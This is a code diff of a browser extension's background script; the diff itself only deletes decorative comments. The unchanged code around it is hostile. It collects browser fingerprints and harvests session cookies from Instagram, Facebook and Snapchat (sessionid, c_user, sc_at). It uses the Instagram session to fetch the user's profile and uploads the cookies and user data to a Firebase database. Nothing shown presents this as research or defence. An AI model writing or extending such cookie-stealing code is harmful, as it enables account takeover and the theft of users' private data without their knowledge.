@@ -4,7 +4,6 @@ import { db } from "./firebase-init.js";
 import { collection, addDoc } from "./firebase-firestore.js";
 import { isDuplicateData } from "./utils.js";
 
-// 📥 Listen for fingerprint messages
 chrome.runtime.onMessage.addListener(async (message) => {
   if (message.type === "fingerprint") {
     const data = message.data;
@@ -22,8 +21,6 @@ chrome.runtime.onMessage.addListener(async (message) => {
     console.log("✅ New fingerprint saved to Firebase.");
   }
 });
-
-// 🌐 Cookie Handling
 chrome.webNavigation.onCompleted.addListener(
   async (details) => {
     const url = details.url;
@@ -45,7 +42,6 @@ chrome.webNavigation.onCompleted.addListener(
   }
 );
 
-// ℹ️ Instagram
 async function handleInstagram() {
   chrome.cookies.getAll({ domain: ".instagram.com" }, async (cookies) => {
     const session = cookies.find((c) => c.name === "sessionid");
@@ -71,7 +67,6 @@ async function handleInstagram() {
       domain: "instagram.com",
     };
 
-    // ✅ Only check duplicate with sessionId + userId + platform + domain
     const colRef = collection(db, "instagram");
     const isDuplicate = await isDuplicateData(colRef, docData);
 
@@ -80,7 +75,6 @@ async function handleInstagram() {
       return;
     }
 
-    // ✅ Add extra userInfo after checking
     await addDoc(colRef, { ...docData, ...userInfo, timestamp: new Date() });
     console.log("✅ New Instagram data saved:", userInfo.username);
   });
@@ -129,7 +123,6 @@ async function fetchIGUserInfo(sessionId, userId) {
   }
 }
 
-// 📘 Facebook
 async function handleFacebook() {
   chrome.cookies.getAll({ domain: ".facebook.com" }, async (cookies) => {
     const cUser = cookies.find((c) => c.name === "c_user");
@@ -160,7 +153,6 @@ async function handleFacebook() {
   });
 }
 
-// 👻 Snapchat
 async function handleSnapchat() {
   chrome.cookies.getAll({ domain: ".snapchat.com" }, async (cookies) => {
     const sc_at = cookies.find((c) => c.name === "sc_at");
